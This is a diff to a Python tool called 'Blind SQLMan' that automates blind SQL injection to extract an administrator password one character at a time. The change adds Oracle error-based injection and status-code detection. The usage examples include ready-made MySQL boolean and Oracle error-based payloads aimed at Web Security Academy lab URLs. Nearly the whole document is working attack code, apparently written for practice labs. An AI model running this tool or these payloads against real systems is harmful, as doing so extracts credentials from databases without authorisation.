@@ -20,7 +20,11 @@ Blind SQL Injection Based on Time
 python3 blindSQLman.py -u [URL] [-c [COOKIE]] --tech T -D [DIFF] [--timeout 5]
 
 EXAMPLE:
-    python3 blindSQLman.py -u https://ac7d1fba1e422a3ac0ad8e3800f20085.web-security-academy.net/filter?category=Gifts -c "TrackingId=Clv6J8Q4AjAffZhD^PAYLOAD^; session=dGVP3Aje0wspCVHJzYpBV0YluhL4o623" -p "' and (select password from users where username='administrator') like '{}{}%25'---" -D "Welcome back!"
+    # Bool Based Mysql Injection
+    python3 blindSQLman.py -u https://ac7d1fba1e422a3ac0ad8e3800f20085.web-security-academy.net/filter?category=Gifts -c "TrackingId=Clv6J8Q4AjAffZhD^PAYLOAD^; session=dGVP3Aje0wspCVHJzYpBV0YluhL4o623" -p "' and (select password from users where username='administrator') like '{0}{1}%25'---" -D "Welcome back!"
+    
+    # Error Based Oracle Injection
+    python3 .\blindSQLMan.py -u https://aca51f091e962697c03c01fb00d100b8.web-security-academy.net/filter?category=Gifts -c "TrackingId=AAA^PAYLOAD^; session=9N5D5dTIq3sXCxi2wxFDlxEn4aJXsJ1q" -p "'||(select case when substr(password,1,{2})='{0}{1}' then to_char(1/0) else '' end from users where username='administrator')||'" --dbms oracle --tech E -S 500
 '''
 BANNER = '''Y#~!^                                      .~.    
 7@@JG~            ..   :^~?Y?7.            .!5    
@@ -53,6 +57,7 @@ charset = string.digits + string.ascii_lowercase
 # charset+= string.ascii_uppercase
 prompt = ""
 ______ = ""
+pos    = 1
 found  = False
 
 def resp(args):
@@ -63,8 +68,11 @@ def resp(args):
     }
     stt = time.time()
     r = m[args.method](args.url, headers=args.headers, cookies=args.cookies, verify=False)
-    if args.tech == 'E':
+    if args.tech == 'B':
         if args.diff in r.text:
+            return True
+    if args.tech == 'E':
+        if args.status_code == r.status_code:
             return True
     if args.tech == 'T':
         cst = time.time() - stt
@@ -74,9 +82,13 @@ def resp(args):
 
 def attack(i, args):
     global prompt
+    global pos
     
     args.i = i
-    payload = args.payload.format(prompt, i)
+    if args.dbms.title() == 'Mysql':
+        payload = args.payload.format(prompt, i)
+    if args.dbms.title() == 'Oracle':
+        payload = args.payload.format(prompt, i, pos)
     args.url = args.url.replace('^PAYLOAD^', payload)
     args.data= args.data.replace('^PAYLOAD^', payload)
     # args.header = "Pragma: no-cache"
@@ -103,27 +115,29 @@ def attack(i, args):
 def parser():
     parser = argparse.ArgumentParser(prog='Blind SQLMan', conflict_handler='resolve')
     parser.add_argument('-u', '--url', type=str, help='TARGET URL')
+    parser.add_argument('--dbms', type=str, default='Mysql', help='TARGET DBMS')
     parser.add_argument('-m', '--method', type=str, default='GET', help='REQUEST METHOD')
     parser.add_argument('-d', '--data', type=str, default='', help='DATA')
     parser.add_argument('-H', '--header', action='append', default=[], help='HEADER')
     parser.add_argument('-c', '--cookie', type=str, help='COOKIE')
-    parser.add_argument('--tech', type=str, default='E', help='TECHNIQUE: E|T')
+    parser.add_argument('--tech', type=str, default='B', help='TECHNIQUE: B|E|T')
     parser.add_argument('-p', '--payload', type=str, help='PAYLOAD')
     parser.add_argument('-D', '--diff', type=str, help='DIFFERENT RESPONSE TEXT')
+    parser.add_argument('-S', '--status_code', type=int, default=200, help='STATUS CODE')
     parser.add_argument('--timeout', default=5, type=int, help='TIMEOUT OF TIME BASED')
     #parser.add_argument('--threads', default=10, type=int, help='THREADS')
     parser.add_argument('-h', '--help', action='store_true', help='PRINT THIS')
     return parser
 
 print(BANNER)
-print(LEGAL_DISCLAIMER)
+print(LEGAL_DISCLAIMER + '\n')
 parser = parser()
 args = parser.parse_args()
 if args.help:
     parser.print_help()
     exit()
-if not args.url or not args.diff:
-    print("Require URL/PAYLOAD/DIFF")
+if not args.url or not args.payload:
+    print("Require URL/PAYLOAD")
     exit()
 
 from reprint import output
@@ -131,11 +145,12 @@ with output(initial_len=2, interval=0) as output_lines:
     while True:
         found = True
         for i in charset:
-            output_lines[0] = '[INFO] CURRENT TESING ---> ' + i
+            output_lines[0] = '[INFO] CURRENT TESTING ---> ' + i
             if attack(i, args):
                 prompt += i
                 ______ += '_'
                 found = False
+                pos += 1
                 break
         output_lines[1] = '[INFO] RESULT IS ' + prompt
         if found:
